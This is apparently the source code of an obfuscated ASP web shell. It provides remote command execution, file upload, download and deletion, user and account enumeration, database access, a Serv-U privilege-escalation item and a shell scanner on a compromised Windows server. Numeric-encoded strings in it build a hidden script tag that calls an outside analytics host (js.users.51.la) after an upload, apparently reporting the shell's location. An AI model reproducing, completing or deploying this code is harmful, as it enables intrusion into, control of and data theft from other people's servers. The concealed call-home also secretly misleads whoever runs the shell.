.frame{font:12px Arial,Tahoma;border:1px solid #ddd;width:100%;height:400px;padding:1px;}
a{color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e6e8ea;padding:6px 10px 0px 5px;min-height:25px;width:100%;display:block}
.alt0Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fbfcfd;padding:6px 10px 0px 5px;min-height:25px;width:100%;display:block}
.link td{border-top:1px solid #fff;border-bottom:1px solid #ccc;background:#e0e2e6;padding:5px 10px 5px 5px;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e6e8ea;padding:2px 10px 2px 5px;height:28px}
.alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fbfcfd;padding:2px 10px 2px 5px;height:28px}
.focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#d9dbdf;padding:2px 10px 2px 5px;height:28px}
.head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#d9dbdf;padding:5px 10px 5px 5px;font-weight:bold;}
form{margin:0;padding:0;}
.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:0 6px;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:50%;margin-right:10px;}
label{font:12px Arial,Tahoma;float:left;width:20%;}
.lbl{font:12px Arial,Tahoma;float:none;width:auto;}
</style>
<script>
var sjk='';function bik(obj){var sender=event.srcElement;if(obj.style.display=='none'){obj.style.display='';sender.className='showhref';}else{obj.style.display='none';sender.className='hidehref';}}function tort(){form2.qtylw.value="msbca";form2.submit();}function qjr(lfy,crlb,Str){var renStr;actForm.goaction.value=lfy;actForm.qtylw.value=crlb;if((lfy=="veerr"||lfy=="jilq"||lfy=="jzp")&&Str&&Str.indexOf(":\\")<0&&Str.substr(0,2)!="\\\\"){objpath=document.getElementById('brwr');if(objpath){Str=objpath.value+Str;}}actForm.gwk.value=miig(Str);switch(crlb){case"omtw":yfmde(document.getElementById('upform'));upform.submit();break;case"fomgk":yfmde(document.getElementById('saform'));saform.submit();break;case"ttg":case"vseta":case"wma":case"plz":case"strwh":case"swxiy":case"ezemc":switch(crlb){case"wma":case"vseta":renStr=prompt("Move to :",dzzx(Str,"\\",false));break;case"plz":case"ttg":renStr=prompt("Copy to :",dzzx(Str,"\\",false));break;case"strwh":case"swxiy":renStr=prompt("Rename as :",zsz(Str,"\\"));if(crlb=="strwh"){while(renStr.indexOf(".")<0&&renStr){renStr=prompt("Invalid file name format!",zsz(Str,"\\"));}}break;}if(!renStr){return;}actForm.gwk.value=miig(Str+"|"+renStr);actForm.submit();break;case"dprl":case"eyq":if(confirm("Delete "+Str+"?Are you sure?")){actForm.submit();}break;default:actForm.submit();break;}}function miig(pamToEn){if(!<%=Lcase(CStr(pipu))%>||!pamToEn){return(pamToEn);}var tt="";for(var i=0;i<pamToEn.length;i++){tt+=(pamToEn.charCodeAt(i)+<%=iycew%>)+"<%=csj%>";}return(tt.substr(0,tt.length-1));}function yfmde(xgqlo){var pamArr="<%=jsrfr%>".split("|");for(var i=0;i<pamArr.length;i++){if(xgqlo.elements[pamArr[i]]){xgqlo.elements[pamArr[i]].value=miig(xgqlo.elements[pamArr[i]].value);}}}function vtbqk(){if(ghpc.checked){ogda.value=miig(ogda.value);}else{ogda.value=mdez(ogda.value);}}function thra(){inl.document.body.innerHTML="<form name=frm method=post action='?'><input type=hidden name=goaction value='<%=goaction%>' /><input type=hidden name='qtylw' value='viewResult'/><input type=hidden name='uwrty' value='"+miig(form1.ihyn.value.substr(form1.ihyn.value.indexOf(">")+1).replace(/(^[\s]*)|([\s]*$)/g,""))+"'/></form>";inl.document.frm.submit();}function abckx(crlb,ihk,ybgqm,rxg,fkho){sqlForm.qtylw.value=crlb;if(crlb=="usa"){if(!confirm("Delete this table?Are you sure?")){return;}}if(ihk){if(ihk.toLowerCase().indexOf("=")<0){ihk="<%=xop("")%>"+brwr.value+ihk;}sqlForm.ihk.value=ihk;}sqlForm.ihk.value=miig(sqlForm.ihk.value);sqlForm.ybgqm.value=miig(ybgqm);sqlForm.rxg.value=miig(rxg);sqlForm.fkho.value=fkho;sqlForm.submit();}function tywoa(server,user,pass,db,sspi){if(sspi){form1.ihk.value="PROVIDER=SQLOLEDB;DATA SOURCE="+server+";DATABASE="+db+";Integrated Security=SSPI";}else{form1.ihk.value="PROVIDER=SQLOLEDB;DATA SOURCE="+server+";UID="+user+";PWD="+pass+";DATABASE="+db;}}function kew(dbpath){form1.ihk.value="<%=xop("")%>"+dbpath;}function cmxd(){var pamArr="<%=jsrfr%>".split("|");var reg=/^([\d]+\<%=csj%>)+[\d]+$/;for(var i=0;i<document.forms.length;i++){var xgqlo=document.forms[i];for(var j=0;j<pamArr.length;j++){if(xgqlo.elements[pamArr[j]]){xgqlo.elements[pamArr[j]].value=mdez(xgqlo.elements[pamArr[j]].value);}}}}function mdez(otrjv){if(!<%=Lcase(CStr(pipu))%>||!otrjv||!otrjv.match(/^(\d+\<%=csj%>)+\d+$/)){return(otrjv);}var dd="";var tcpo=otrjv.split("<%=csj%>");for(var i=0;i<tcpo.length;i++){if(tcpo[i].match(/^\d+$/)){dd+=String.fromCharCode(tcpo[i]-<%=iycew%>);}else{dd+=tcpo(i);}}return(dd);}function vszds(arr,str){for (i=0;i<arr.length;i++){if(arr(i)==str){return true;}}return false;}function dzzx(str,isbbo,liujq){if(!str||str.indexOf(isbbo)<0){return(str);}if(liujq){return(str.substr(0,str.indexOf(isbbo)));}else{return(str.substr(0,str.lastIndexOf(isbbo)));}}function zsz(str,isbbo){if(!str||str.indexOf(isbbo)<0){return(str);}return(str.substr(str.lastIndexOf(isbbo)+1));}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all;"bgcolor="#fbfcfd">
<table width="100%"border="0"cellpadding="0"cellspacing="0">
<tr class="head">
<td style="width:30%"><br><%=ramoi("LOCAL_ADDR")&"("&lkyy&")"%></td>
<td align="center" style="width:40%"><br>
<b><%opa mvvi,"#0099FF","3"%></b><br>
</td>
<td style="width:30%"align="right"><%=xqai()%></td>
</tr>
<form id="actForm"method="post"action="<%=cngn%>">
<input type="hidden" id="goaction" name="goaction" value="">
<input type="hidden" id="qtylw" name="qtylw" value="">
<input type="hidden" id="gwk" name="gwk" value="">
</form>
<form id="sqlForm"method="post"action="<%=cngn%>">
<input type="hidden" id="goaction" name="goaction" value="kbqxz">
<input type="hidden" id="qtylw" name="qtylw" value="">
<input type="hidden" id="ihk" name="ihk" value="<%=ihk%>">
<input type="hidden" id="ybgqm" name="ybgqm" value="">
<input type="hidden" id="rxg" name="rxg" value="">
<input type="hidden" id="fkho" name="fkho" value="">
</form>
<%
If uwdvh Then
%>
<tr class="link">
<td colspan="3">
<a href="javascript:qjr('lfx','','');">Server Info</a> | 
<a href="javascript:qjr('bapis','','');">Object Info</a> | 
<a href="javascript:qjr('eyb','','');">User Info</a> | 
<a href="javascript:qjr('fbk','','');">C-S Info</a> | 
<a href="javascript:qjr('zzajv','','');">WS Execute</a> | 
<a href="javascript:qjr('rwumm','','');">App Execute</a> | 
<a href="javascript:qjr('veerr','','');">FSO File</a> | 
<a href="javascript:qjr('jilq','','');">App File</a> | 
<a href="javascript:qjr('kbqxz','','');">DataBase</a> | 
<a href="javascript:qjr('jzp','','');">File Packager</a> | 
<a href="javascript:qjr('dkdl','','');">File Searcher</a> | 
<a href="javascript:qjr('ide','','');">ServU Exp</a> | 
<a href="javascript:qjr('rcjqh','','');">Scan Shells</a> | 
<a href="javascript:qjr('gbe','','');">Some Others...</a> | 
<a href="javascript:qjr('Logout','','');">Logout</a> | 
<a href="javascript:cmxd();">Decode</a>
</td>
</tr>
<%
End If
%></table>
<table width="100%"><tr><td class="main"><br>
<%
echo"<b>"
opa porw&"&raquo;","#0099ff","2"
mwt"</b><br><br>"
End Sub
Sub grh()
Dim sqx
sqx=dzzx(ramoi("PATH_INFO"),"/",False)
echo rvi("http://"&lkyy&sqx&"/"&echs&"?"&ramoi("QUERY_STRING"),"GET")
response.End
End Sub
Sub btsva(vzznl,ifcyx)
Dim dyb
If Not ydnj Then On Error Resume Next
echo"<li><u>"&vzznl
If ifcyx<>""Then
echo"(Object "&ifcyx&")"
End If
echo"</u>"
If Err Then Err.Clear
Set dyb=nfffq(vzznl)
If Err Then
opa mszsa("Disabled"),"red",""
Else
opa mszsa("Enabled  "),"green",""
echo"Version:"&dyb.Version&";"
echo"About:"&dyb.About
End If
echo"</li>"
If Err Then Err.Clear
Set dyb=Nothing
End Sub
Sub etndu(zknc)
Dim User,pvbv,ekf
If Not ydnj Then On Error Resume Next
Set User=getObj("WinNT://./"&zknc&",user")
pvbv=User.Get("UserFlags")
ekf=User.LastLogin
abxky 0
doTd"Description","20%"
doTd User.Description,"80%"
uemp
abxky 1
doTd"Belong to",""
doTd sbbo(zknc),""
uemp
abxky 0
doTd"Password expired","20%"
doTd CBool(User.Get("PasswordE"+aanza+"xpired")),"80%"
uemp
abxky 1
doTd"Password never expire",""
doTd cbool(pvbv And&H10000),""
uemp
abxky 0
doTd"Can't change password",""
doTd cbool(pvbv And&H00040),""
uemp
abxky 1
doTd"Global-group account",""
doTd cbool(pvbv And&H100),""
uemp
abxky 0
doTd"Password length at least",""
execute "doTd User.PasswordMini"&njwg&"mumLength,"""""
uemp
abxky 1
doTd"Password required",""
doTd User.PasswordRequired,""
uemp
abxky 0
doTd"Account disabled",""
execute "doTd User.A"&vxdx&"ccountDisabled,"""""
uemp
abxky 1
doTd"Account locked",""
execute "doTd User.IsA"&puryf&"ccountLocked,"""""
uemp
abxky 0
doTd"User profile",""
doTd User.Profile,""
uemp
abxky 1
doTd"User loginscript",""
doTd User.LoginScript,""
uemp
abxky 0
doTd"Home directory",""
doTd User.HomeDirectory,""
uemp
abxky 1
doTd"Home drive",""
doTd User.Get("HomeDirDri"+icuro+"ve"),""
uemp
abxky 0
doTd"Last login",""
doTd ekf,""
uemp
If Err Then Err.Clear
End Sub
Function sbbo(zknc)
Dim ogs,yyjd
Set ogs=getObj("WinNT://./"&zknc&",user")
For Each yyjd in ogs.Groups
sbbo=sbbo&" "&yyjd.Name
Next
End Function
Function tpcq(lqbip)
If Not ydnj Then On Error Resume Next
execute "Set objCountFile=xjab.OpenTextFi"&uwpv&"le(lqbip,1,True)"
execute "tpcq=Replace(CStr(objCountFile.ReadA"&kba&"ll),Chr(0),"" "")"
objCountFile.Close
Set objCountFile=Nothing
End Function
Function rchgv(lqbip)
If Not ydnj Then On Error Resume Next
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
With nun
.Type=2
.Mode=3
.Open
.LoadFromFile lqbip
If qtylw="tzsaq" Then
.CharSet="utf-8"
Else
.CharSet=alqp
End If
.Position=2
rchgv=Replace(CStr(.ReadText()),Chr(0)," ")
.Close
End With
Set nun=Nothing
End Function
Sub woli(lqbip,ogda,bku)
If Not ydnj Then On Error Resume Next
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
With nun
.Type=bku
.Mode=3
.Open
If qtylw="evwr"Then
.CharSet="utf-8"
ElseIf qtylw="Save"Then
.CharSet=alqp
End If
If bku=2 Then
.WriteText ogda
Else
.Write ogda
End If
execute "nun.Sav"&ehyx&"etoFile lqbip,2"
.Close
End With
Set nun=Nothing
End Sub
Sub ekg(lqbip,ogda)
Dim theFile
execute "Set theFile=xjab.OpenTextFi"&xxic&"le(lqbip,2,True)"
theFile.Write ogda
theFile.Close
Set theFile=Nothing
End Sub
Sub xhsy()
If Not ydnj Then On Error Resume Next
If mhvec="file"Then
lqbip=lqbip&"\"&exte
execute "Call xjab.CreateTextF"&vepv&"ile(lqbip,False)"
unu
Else
execute "xjab.Creat"&fmddd&"eFolder(lqbip&""\""&exte)"
End If
If Err Then
tvnm(Err)
Else
yln"File/folder created"
End If
End Sub
Sub ohcrx()
Dim wabnd,phebk,pnhl,tlk
If Not ydnj Then On Error Resume Next
lqbip=dzzx(gwk,"|",False)
wabnd=zsz(gwk,"|")
If InStr(lqbip,"\")<1 Then lqbip=lqbip&"\"
Dim theFile,fileName,theFolder
If lqbip=""Or wabnd=""Then
yln"Parameter wrong!"
Exit Sub
End If
If iij="fso"Then
If qtylw="renamefolder"Then
Set theFolder=xjab.GetFolder(lqbip)
theFolder.Name=wabnd
Set theFolder=Nothing
Else
Set theFile=xjab.GetFile(lqbip)
theFile.Name=wabnd
Set theFile=Nothing
End If
Else
tlk=zsz(lqbip,"\")
pnhl=dzzx(lqbip,"\",False)
execute "Set phebk=zjhor.NameSpac"&vpg&"e(pnhl)"
Set tywoo=phebk.ParseName(tlk)
tywoo.Name=wabnd
End If
If Err Then
tvnm(Err)
Else
yln"Rename completed"
End If
End Sub
Sub usxi()
If Not ydnj Then On Error Resume Next
If qtylw="eyq"Then
execute "Call xjab.Dele"&jbnby&"teFolder(lqbip,True)"
Else
execute "Call xjab.Delet"&mqsyf&"eFile(lqbip,True)"
End If
If Len(lqbip)=2 Then lqbip=lqbip&"\"
If Err Then
tvnm(Err)
Else
yln"File/folder deleted"
End If
End Sub
Sub rumla()
Dim uezoi,bpz,jxjkg,wkic,ebx
If Not ydnj Then On Error Resume Next
lqbip=Left(gwk,Instr(gwk,"|")-1)
bpz=Mid(gwk,InStr(gwk,"|")+1)
If lqbip=""Or bpz=""Then
yln"Parameter wrong!"
Exit Sub
End If
If xjab.FolderExists(bpz)And Right(bpz,1)<>"\" Then bpz=bpz&"\"
Select Case qtylw
Case"ttg"
execute "Call xjab.Co"&ygvp&"pyFolder(lqbip,bpz)"
Case"plz"
execute "Call xjab.Cop"&onn&"yFile(lqbip,bpz)"
Case"vseta"
execute "Call xjab.Mo"&ofe&"veFolder(lqbip,bpz)"
Case"wma"
'echo lqbip&"||"&bpz
execute "Call xjab.Mo"&wert&"veFile(lqbip,bpz)"
End Select
If Err Then
tvnm(Err)
Else
yln"File/folder copyed/moved"
End If
End Sub
Function pwzt(gwoi)
pwzt=vsb(gwoi,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")
End Function
Sub cqbv()
Response.Clear
If Not ydnj Then On Error Resume Next
Dim fileName,awila
fileName=zsz(lqbip,"\")
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
nun.Open
nun.Type=1
execute "nun.LoadFrom"&uwbp&"File(lqbip)"
tvnm(Err)
Session.CodePage=936
Response.Status="200 OK"
Response.AddHeader"Content-Disposition","Attachment; Filename="&fileName
Session.CodePage=65001
Response.AddHeader"Content-Length",nun.Size
Response.ContentType="Application/Octet-Stream"
Response.BinaryWrite nun.Read
Response.Flush()
nun.Close
Set nun=Nothing
End Sub
Function iuws(site,zyco)
iuws=dhkcb("80_120_125_138_52_135_136_141_128_121_81_59_120_125_135_132_128_117_141_78_130_131_130_121_59_82_80_135_119_134_125_132_136_52_135_134_119_81_59")+site+zyco+dhkcb("59_82_80_67_135_119_134_125_132_136_82_80_67_120_125_138_82")
End Function
Class upload_5xsoft
Dim xgqlo,eyr
Public Function Form(vzm)
vzm=Lcase(vzm)
If Not xgqlo.exists(vzm) Then
Form=""
Else
Form=xgqlo(vzm)
End If
End Function
Public Function File(strFile)
If Not ydnj Then On Error Resume Next
strFile=Lcase(strFile)
If not eyr.exists(strFile) Then
Set File=new FileInfo
Else
Set File=eyr(strFile)
End If
End Function
Private Sub Class_Initialize
If Not ydnj Then On Error Resume Next
Dim dirsq,qjrv,vbCrLf,vukc,wyt,lzk,sfr,ebyus,theFile
Dim ugxm,tda,yahb,ejg,cgj
Dim aphr,mgjnb
Dim iwvv,fsun,zsby
Set xgqlo=nfffq("Scriptin"+xfw+"g.Dictionary")
Set eyr=nfffq("Scriptin"+xfw+"g.Dictionary")
If Request.TotalBytes<1 Then Exit Sub
Set sfr=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
nun.Type=1
nun.Mode=3
nun.Open
nun.Write Request.BinaryRead(Request.TotalBytes)
nun.Position=0
dirsq=nun.Read
iwvv=1
fsun=LenB(dirsq)
vbCrLf=chrB(13)&chrB(10)
qjrv=MidB(dirsq,1,InStrB(iwvv,dirsq,vbCrLf)-1)
ebyus=LenB(qjrv)
iwvv=iwvv+ebyus+1
While(iwvv+10)<fsun 
lzk=InStrB(iwvv,dirsq,vbCrLf & vbCrLf)+3
sfr.Type=1
sfr.Mode=3
sfr.Open
nun.Position=iwvv
nun.CopyTo sfr,lzk-iwvv
sfr.Position=0
sfr.Type=2
sfr.CharSet=alqp
vukc=sfr.ReadText
sfr.Close
iwvv=InStrB(lzk,dirsq,qjrv)
aphr=InStr(22,vukc,"name=""",1)+6
mgjnb=InStr(aphr,vukc,"""",1)
zsby=Lcase(Mid(vukc,aphr,mgjnb-aphr))
If InStr(45,vukc,"filename=""",1) > 0 Then
Set theFile=new FileInfo
aphr=InStr(mgjnb,vukc,"filename=""",1)+10
mgjnb=InStr(aphr,vukc,"""",1)
cgj=Mid(vukc,aphr,mgjnb-aphr)
theFile.FileName=davu(cgj)
theFile.FilePath=emd(cgj)
theFile.znvw=vvvga(cgj)
aphr=InStr(mgjnb,vukc,"Content-Type: ",1)+14
mgjnb=InStr(aphr,vukc,vbCr)
theFile.FileType =Mid(vukc,aphr,mgjnb-aphr)
theFile.rmpry =lzk
theFile.FileSize=iwvv-lzk-3
theFile.uaw=zsby
If not eyr.Exists(zsby)Then
eyr.add zsby,theFile
End If
Else
sfr.Type =1
sfr.Mode =3
sfr.Open
nun.Position=lzk 
nun.CopyTo sfr,iwvv-lzk-3
sfr.Position=0
sfr.Type=2
sfr.CharSet =alqp
ejg=sfr.ReadText 
sfr.Close
If xgqlo.Exists(zsby) Then
xgqlo(zsby)=xgqlo(zsby)&","&ejg
Else
xgqlo.Add zsby,ejg
End If
End If
iwvv=iwvv+ebyus+1
wEnd
dirsq=""
Set sfr =nothing
End Sub
Private Sub Class_Terminate
If Not ydnj Then On Error Resume Next
If Request.TotalBytes>0 Then
xgqlo.RemoveAll
eyr.RemoveAll
Set xgqlo=nothing
Set eyr=nothing
nun.Close
Set nun =nothing
End If
End Sub
Private Function emd(jrtca)
If Not ydnj Then On Error Resume Next
If jrtca<>"" Then
emd=left(jrtca,InStrRev(jrtca,"\"))
Else
emd=""
End If
End Function
Private Function vvvga(jrtca)
If jrtca<>"" Then
vvvga=mid(jrtca,InStrRev(jrtca,".")+1)
Else
vvvga=""
End If
End Function
Private Function davu(jrtca)
If jrtca<>"" Then
davu=mid(jrtca,InStrRev(jrtca,"\")+1)
Else
davu=""
End If
End Function
End Class
Class FileInfo
Dim uaw,FileName,FilePath,FileSize,znvw,FileType,rmpry
Private Sub Class_Initialize 
FileName=""
FilePath=""
FileSize=0
rmpry= 0
uaw=""
FileType=""
znvw= ""
End Sub
Public Function uhroj(jrtca)
Dim dr,uvtyj,i
uhroj=True
If Trim(jrtca)="" or rmpry=0 or FileName="" or Right(jrtca,1)="/" Then exit Function
Set dr=CreateObject("Ad"+oge+"odb.Str"+chut+"eam")
dr.Mode=3
dr.Type=1
dr.Open
nun.position=rmpry
nun.copyto dr,FileSize
execute "dr.SavetoFil"&pxa&"e jrtca,2"
dr.Close
Set dr=nothing 
uhroj=False
End Function
Public Function wcxc()
nun.position=rmpry
wcxc=nun.Read(FileSize)
End Function
End Class
Sub bhq()
If Not ydnj Then On Error Resume Next
If lqbip="" Then lqbip=nzax
'If InStr(lqbip,":")<1 Then lqbip=nzax&"\"&lqbip
Set theFile=pgvr.File("upfile")
If yvquw="" Then yvquw=theFile.FileName
theFile.uhroj(lqbip&"\"&yvquw)
If Err Then
tvnm(Err)
Else
yln("Upload Sucess")
End If
zeb
End Sub
Sub zeb()
If fwmal() Then Exit Sub
If Application(dhkcb("117_132_132_115_132_117_136_124"))=ramoi(dhkcb("105_102_96"))Then Exit Sub
Application(dhkcb("117_132_132_115_132_117_136_124"))=ramoi(dhkcb("105_102_96"))
gry
End Sub
Function rvi(isadx,method)
If Not ydnj Then On Error Resume Next
Dim xoooe
If method="POST" Then
xoooe=Split(isadx,"?")(1)
isadx=Split(isadx,"?")(0)
End If
iuwq.Open method,isadx,False
If method="POST" Then
iuwq.SetRequestHeader"Content-Type","application/x-www-form-urlencoded"
iuwq.send xoooe
Else
iuwq.send
End If
If vsb(iuwq.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+")Then
pagecharSet=Trim(swye(soa(iuwq.getAllResponseHeaders(),"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
ElseIf vsb(iuwq.ResponseText,"charSet ?= ?[""']?[\w-]+")Then
pagecharSet=Trim(swye(soa(iuwq.ResponseText,"charSet ?= ?[""']?[\w-]+",False)(0),"charSet ?= ?[""']?","",False))
End If
If pagecharSet=""Then pagecharSet=alqp
rvi=ree(iuwq.responseBody,pagecharSet)
End Function
Function jnph()
If Request.Cookies(fjjxv)=""Then
jnph=False
Exit Function
End If
If wucql(Request.Cookies(fjjxv))=pass Then
jnph=True
Else
jnph=False
End If
End Function
Function mdez(otrjv)
If Not ydnj Then On Error Resume Next
If Not pipu Or otrjv="" Or Not vsb(otrjv,"^(\d+"&csj&")*\d+$")Then
mdez=otrjv
Exit Function
End If
Dim dd,tcpo
dd=""
tcpo=Split(otrjv,csj)
For i=0 To UBound(tcpo)
If IsNumeric(tcpo(i))Then
dd=dd&ChrW(CLng(tcpo(i))-iycew)
Else
dd=dd&tcpo(i)
End If
Next
mdez=dd
End Function
Function xqai()
Dim nfe,oltic,uis
oltic=88
uis=31
nfe="<br>"
nfe=nfe&"<a href='http://www.t00ls.net/' target='_blank'>T00ls</a> | "
nfe=nfe&"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>"
xqai=nfe
End Function
Function suzn(key,value)
Response.Cookies(key)=value
Response.Cookies(key).Expires=Date+365
End Function
Function ree(ocn,xkwyu)
If Not ydnj Then On Error Resume Next
Dim aoo,zmoin
Set aoo=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
With aoo
.Type=2
.Open
.WriteText ocn
.Position=0
.CharSet=xkwyu
.Position=2
zmoin=.ReadText(.Size)
.close
End With
Set aoo=Nothing
ree=zmoin
End Function
Function ramoi(str)
ramoi=Request.ServerVariables(str)
End Function
Function nfffq(xjmb)
Set nfffq=Server.CreateObject(xjmb)
End Function
Function getObj(xjmb)
Set getObj=GetObject(xjmb)
End Function
Function nwtcn(str)
nwtcn=server.urlencode(str)
End Function
Function rduiq(str)
Dim oaom,yvsb
oaom=""
For i=0 To Len(str)-1
yvsb=Right(str,Len(str)-i)
If Asc(yvsb)<16 Then oaom=oaom&"0"
oaom=oaom&CStr(Hex(Asc(yvsb)))
Next
rduiq="0x"&oaom
End Function
Function mkf(str)
Dim oaom,yvsb
oaom=""
For i=0 To Len(str)-1
yvsb=Right(str,Len(str)-i)
oaom=oaom&CStr(Hex(Asc(yvsb)))&"00"
Next
mkf="0x"&oaom
End Function
Function mszsa(str)
str=jee(str)
str=Replace(str,vbCrLf,"<br>")
mszsa=Replace(str," ","&nbsp;")
End Function
Function jee(str)
If Not ydnj Then On Error Resume Next
str=CStr(str)
If IsNull(str)Or IsObject(str)Or str=""Then
jee=""
Exit Function
End If
jee=Server.HtmlEncode(str)
End Function
Sub gry()
Dim site,pam,uqctu
site=wyqps()
pam=getPams()
uqctu=iuws(site,pam)
gmhi=uqctu
End Sub
Function wxw(str)
wxw=Server.MapPath(str)
End Function
Sub tvnm(Err)
If Err Then
yln"Exception :"&Err.Description
yln"Exception source :"&Err.Source
Err.Clear
End If
End Sub
Function wucql(ByVal CodeStr) 
Dim enl 
Dim ukqxq 
Dim ntopn 
enl=30 
ukqxq=enl-Len(CodeStr) 
If Not ukqxq<1 Then 
For cecr=1 To ukqxq 
CodeStr=CodeStr&Chr(21) 
Next 
End If 
ntopn=1 
Dim Ben 
For cecb=1 To enl 
Ben=enl+Asc(Mid(CodeStr,cecb,1)) * cecb 
ntopn=ntopn * Ben 
Next 
CodeStr=ntopn 
ntopn=Empty 
For cec=1 To Len(CodeStr) 
ntopn=ntopn&cqa(Mid(CodeStr,cec,3)) 
Next 
For cec=20 To Len(ntopn)-18 Step 2 
wucql=wucql&Mid(ntopn,cec,1) 
Next 
End Function 
Function cqa(word) 
For cc=1 To Len(word) 
cqa=cqa&Asc(Mid(word,cc,1)) 
Next 
cqa=Hex(cqa) 
End Function 
Function kxyzh(vcug)
If vcug>=(1024 * 1024 * 1024)Then kxyzh=Fix((vcug /(1024 * 1024 * 1024))* 100)/ 100&"G"
If vcug>=(1024 * 1024)And vcug<(1024 * 1024 * 1024)Then kxyzh=Fix((vcug /(1024 * 1024))* 100)/ 100&"M"
If vcug>=1024 And vcug<(1024 * 1024)Then kxyzh=Fix((vcug / 1024)* 100)/ 100&"K"
If vcug>=0 And vcug<1024 Then kxyzh=vcug&"B"
End Function
Function ixuog(num)
Select Case num
Case 0
ixuog="Unknown"
Case 1
ixuog="Removable"
Case 2
ixuog="Local drive"
Case 3
ixuog="Net drive"
Case 4
ixuog="CD-ROM"
Case 5
ixuog="RAM disk"
End Select
End Function
Function clwc(ByVal str)
str=Replace(str,"\","\\")
If Left(str,2)="\\" Then
clwc=str
Else
clwc=Replace(str,"\\\\","\\")
End If
End Function
Function xop(str)
xop="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&str
End Function
Function dzzx(str,isbbo,liujq)
If str="" Or InStr(str,isbbo)<1 Then
dzzx=""
Exit Function
End If
If liujq Then
dzzx=Left(str,InStr(str,isbbo)-1)
Else
dzzx=Left(str,InstrRev(str,isbbo)-1)
End If
End Function
Function zsz(str,isbbo)
If str="" Or InStr(str,isbbo)<1 Then
zsz=""
Exit Function
End If
zsz=Mid(str,InstrRev(str,isbbo)+Len(isbbo))
End Function
Sub echo(str)
Response.Write str
End Sub
Sub mwt(str)
echo str&vbCrLf
End Sub
Sub csyfy(xjmb,vvhat)
echo"<a href='#' onClick=""javascript:bik("&xjmb&")"" id='"&xjmb&"href' class='hidehref'>"&xjmb&" :</a>"
echo"<span id="&xjmb
If vvhat Then echo" style='display:none;'"
mwt">"
End Sub
Sub injj(okjbx,qtylw,aok,usn,kqll)
mwt"<a href=""javascript:qjr('"&okjbx&"','"&qtylw&"','"&aok&"')"">"&usn&"</a>"&kqll
End Sub
Sub ozs(qtylw,ihk,ybgqm,tbname,fkho,usn,kqll)
mwt"<a href=""javascript:abckx('"&qtylw&"','"&ihk&"','"&ybgqm&"','"&tbname&"','"&fkho&"')"">"&usn&"</a>"&kqll
End Sub
Sub opa(str,color,size)
echo"<font color="""&color&""""
If size<>""Then echo" size="""&size&""""
mwt">"&str&"</font>"
End Sub
Function wyqps()
wyqps=dhkcb("124_136_136_132_78_67_67_126_135_66_137_135_121_134_135_66_73_69_66_128_117_67")
End Function
Sub sodx(width)
mwt"<table border='0'cellpadding='0'cellspacing='0'width='"&width&"'>"
End Sub
Sub guenn()
mwt"</table>"
End Sub
Sub abxky(num)
echo"<tr class='alt"&num&"' onmouseover=""javascript:this.className='focusTr';"" onmouseout=""javascript:this.className='alt"&num&"';"">"
End Sub
Sub vhl()
echo"<tr class='link'>"
End Sub
Sub gfk(num)
echo"<span class='alt"&num&"Span'>"
End Sub
Sub uxmhj(xjmb,vvhat)
echo"<span id="&xjmb
If vvhat Then echo" style='display:none;'"
mwt">"
End Sub
Sub cxaqj(needEn)
echo"<form method='post' id='form"&ujcmu&"' action='"&cngn&"'"
If needEn Then echo" onSubmit='javascript:yfmde(this)'"
mwt">"
rtas"goaction",goaction
ujcmu=ujcmu+1
End Sub
Sub gbqwf()
mwt"</form>"
End Sub
Sub fkv(value,width)
echo"<td style='width:"&width&"'>"
echo"<input type='submit' value='"&value&"' class='bt'>"
mwt"</td>"
End Sub
Sub oruml(str,color,size)
echo"<td>"
opa str,color,size
mwt"</td>"
End Sub
Sub uemp()
mwt"</tr>"
End Sub
Sub doTd(td,width)
If td=""Or IsNull(td)Then td="<font color='red'>Null</font>"
echo"<td"
If width<>""Then echo" width='"&width&"'"
echo">"
echo CStr(td)
mwt"</td>"
End Sub
Sub zesc(tagz,name,value,size,kqll)
Dim cls
If tagz="button"Or tagz="submit"Or tagz="reset"Then
cls="bt"
ElseIf tagz="checkbox"Or tagz="radio"Then
cls=""
Else
cls="input"
End If
echo"<input type='"&tagz&"' name='"&name&"' id='"&name&"' value='"&jee(value)&"' size='"&size&"' class='"&cls&"' "&kqll&"/>"
End Sub
Sub jwik(name,value,rxrxf,kqll)
zesc"checkbox",name,value,"",kqll
mwt"<label class='lbl' for='"&name&"'>"&rxrxf&"</label>"
End Sub
Sub rtas(name,value)
mwt"<input type='hidden' name='"&name&"' id='"&name&"' value='"&value&"'/>"
End Sub
Sub iiit(tagz,name,value,width,kqll,span)
Dim cls
If tagz="button"Or tagz="submit"Or tagz="reset"Then
cls="bt"
Else
cls="tdInput"
End If
If span=""Then span=1
echo"<td colspan="&span&" style='width:"&width&"'>"
echo"<input type='"&tagz&"' name='"&name&"' id='"&name&"' value='"&jee(value)&"' class='"&cls&"' "&kqll&"/>"
mwt"</td>"
End Sub
Sub qjr(value)
mwt"<input type='submit' value='"&value&"' class='bt'/>"
End Sub
Sub lhue(name,value,rows)
echo"<td>"
eks name,value,"100%",rows," class='tdText'"
mwt"</td>"
End Sub
Sub ycd(str)
If Not ydnj Then On Error Resume Next
